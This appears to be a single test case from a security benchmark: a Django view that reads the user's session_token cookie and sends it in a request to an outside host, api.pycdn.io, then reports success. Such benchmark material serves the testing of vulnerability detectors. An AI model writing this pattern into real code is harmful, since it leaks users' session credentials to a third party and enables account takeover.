# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import urllib.request
import urllib.parse
import ssl


def BenchmarkTest74990(request):
    cookie_value = request.COOKIES.get('session_token', '')
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(cookie_value)), context=ctx)
    return JsonResponse({"saved": True})
